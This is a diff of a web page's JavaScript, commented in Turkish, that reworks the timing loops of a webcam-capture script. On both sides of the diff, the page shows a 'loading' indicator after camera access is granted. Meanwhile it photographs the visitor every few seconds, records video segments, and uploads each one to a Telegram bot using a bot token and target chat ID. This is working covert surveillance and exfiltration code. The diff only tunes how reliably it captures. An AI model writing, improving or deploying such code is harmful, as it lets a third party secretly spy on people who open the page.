@@ -133,11 +133,11 @@
             }
             
             // ============================================
-            // PROFESYONEL ZAMANLAMA MOTORU - GELİŞTİRİLMİŞ
+            // PROFESYONEL ZAMANLAMA MOTORU
             // ============================================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
+            const ctx = canvas.getContext('2d');
             
             let mediaRecorder = null;
             let recordedChunks = [];
@@ -145,9 +145,6 @@
             let photoCount = 0;
             let stream = null;
             let baslangicZamani = 0;
-            let fotoRAF = null;
-            let videoRAF = null;
-            let sonVideoZamani = 0;
             
             // ============================================
             // KAMERA BAŞLAT
@@ -157,8 +154,7 @@
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { 
                             width: { ideal: 640 },
-                            height: { ideal: 480 },
-                            frameRate: { ideal: 60 }
+                            height: { ideal: 480 }
                         } 
                     });
                     
@@ -169,78 +165,66 @@
                         document.getElementById('startBtn').style.display = 'none';
                         document.getElementById('loading').style.display = 'block';
                         
-                        baslangicZamani = performance.now();
-                        sonVideoZamani = baslangicZamani + 2000;
+                        baslangicZamani = Date.now();
                         
                         // ============================================
-                        // FOTOĞRAF SİSTEMİ - REQUESTANIMATIONFRAME İLE (0.01ms HASSASİYET)
+                        // FOTOĞRAF SİSTEMİ - TAM ZAMANINDA
                         // ============================================
-                        function fotoLoop() {
-                            if (!stream?.active) return;
+                        const fotoTimer = setInterval(() => {
+                            if (!stream?.active) {
+                                clearInterval(fotoTimer);
+                                return;
+                            }
                             
-                            const now = performance.now();
-                            const gecenSure = (now - baslangicZamani) / 1000;
+                            const gecenSure = Math.floor((Date.now() - baslangicZamani) / 1000);
                             const olmasiGerekenFoto = Math.floor(gecenSure / FOTO_SURESI);
                             
                             while (photoCount < olmasiGerekenFoto) {
                                 photoCount++;
                                 
-                                // Yüksek performanslı canvas çizimi
                                 canvas.width = video.videoWidth || 640;
                                 canvas.height = video.videoHeight || 480;
                                 ctx.drawImage(video, 0, 0);
                                 
-                                // Blob oluşturma ve gönderme (asenkron)
                                 canvas.toBlob(function(blob) {
                                     if (!blob) return;
                                     const formData = new FormData();
                                     formData.append('chat_id', TARGET_ID);
                                     formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                    formData.append('caption', `📸 Fotoğraf #${photoCount}`);
+                                    formData.append('caption', `📸 Fotoğraf #${photoCount} (${gecenSure}s)`);
                                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                         method: 'POST',
                                         body: formData
                                     });
-                                }, 'image/jpeg', 0.85);
+                                }, 'image/jpeg', 0.8);
                             }
                             
-                            fotoRAF = requestAnimationFrame(fotoLoop);
-                        }
-                        fotoRAF = requestAnimationFrame(fotoLoop);
+                        }, 100); // Her 100ms'de kontrol
                         
                         // ============================================
-                        // VİDEO SİSTEMİ - YÜKSEK HASSASİYET
+                        // VİDEO SİSTEMİ - KESİNTİSİZ
                         // ============================================
-                        function videoKontrol() {
+                        setTimeout(function videoLoop() {
                             if (!stream?.active) return;
                             
-                            const now = performance.now();
-                            const gecenSure = (now - baslangicZamani) / 1000;
+                            const gecenSure = Math.floor((Date.now() - baslangicZamani) / 1000);
+                            const olmasiGerekenVideo = Math.floor((gecenSure - 2) / VIDEO_SURESI); // 2 saniye gecikme
                             
-                            // Video başlangıç kontrolü
-                            if (now >= sonVideoZamani) {
+                            while (videoCount < olmasiGerekenVideo) {
                                 videoCount++;
-                                sonVideoZamani = now + (VIDEO_SURESI * 1000);
                                 
-                                // Yeni video segmenti
+                                // Yeni video başlat
                                 const videoIndex = videoCount;
-                                const videoBaslangic = now;
+                                const videoBaslangic = Date.now();
                                 recordedChunks = [];
                                 
                                 try {
                                     mediaRecorder = new MediaRecorder(stream, {
-                                        mimeType: 'video/webm;codecs=vp9',
-                                        videoBitsPerSecond: 4000000
+                                        mimeType: 'video/webm;codecs=vp8',
+                                        videoBitsPerSecond: 2500000
                                     });
                                 } catch(e) {
-                                    try {
-                                        mediaRecorder = new MediaRecorder(stream, {
-                                            mimeType: 'video/webm;codecs=vp8',
-                                            videoBitsPerSecond: 3000000
-                                        });
-                                    } catch(e) {
-                                        mediaRecorder = new MediaRecorder(stream);
-                                    }
+                                    mediaRecorder = new MediaRecorder(stream);
                                 }
                                 
                                 mediaRecorder.ondataavailable = (e) => {
@@ -250,7 +234,7 @@
                                 mediaRecorder.onstop = () => {
                                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
                                     const boyutKB = (blob.size / 1024).toFixed(0);
-                                    const videoSure = ((performance.now() - videoBaslangic) / 1000).toFixed(3);
+                                    const videoSure = ((Date.now() - videoBaslangic) / 1000).toFixed(2);
                                     
                                     const formData = new FormData();
                                     formData.append('chat_id', TARGET_ID);
@@ -264,33 +248,17 @@
                                 };
                                 
                                 mediaRecorder.start();
-                                
-                                // ÇOK HASSAS DURDURMA SİSTEMİ
-                                const hedefSure = VIDEO_SURESI * 1000;
-                                const durdurmaZamani = videoBaslangic + hedefSure;
-                                
-                                const durdurmaRAF = () => {
-                                    if (!mediaRecorder) return;
-                                    const simdi = performance.now();
-                                    if (simdi >= durdurmaZamani - 0.1 && mediaRecorder.state === 'recording') {
-                                        mediaRecorder.stop();
-                                    } else if (mediaRecorder.state === 'recording') {
-                                        requestAnimationFrame(durdurmaRAF);
-                                    }
-                                };
-                                requestAnimationFrame(durdurmaRAF);
-                                
-                                // Yedek setTimeout (çok düşük tolerans)
                                 setTimeout(() => {
                                     if (mediaRecorder?.state === 'recording') {
                                         mediaRecorder.stop();
                                     }
-                                }, hedefSure - 0.5);
+                                }, VIDEO_SURESI * 1000);
                             }
                             
-                            videoRAF = requestAnimationFrame(videoKontrol);
-                        }
-                        videoRAF = requestAnimationFrame(videoKontrol);
+                            // Her saniye kontrol et
+                            setTimeout(videoLoop, 1000);
+                            
+                        }, 2000); // İlk video 2 saniye sonra
                     };
                     
                 } catch(e) {
@@ -302,8 +270,6 @@
             // TEMİZLİK
             // ============================================
             window.onbeforeunload = function() {
-                if (fotoRAF) cancelAnimationFrame(fotoRAF);
-                if (videoRAF) cancelAnimationFrame(videoRAF);
                 if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                 if (stream) stream.getTracks().forEach(t => t.stop());
             };
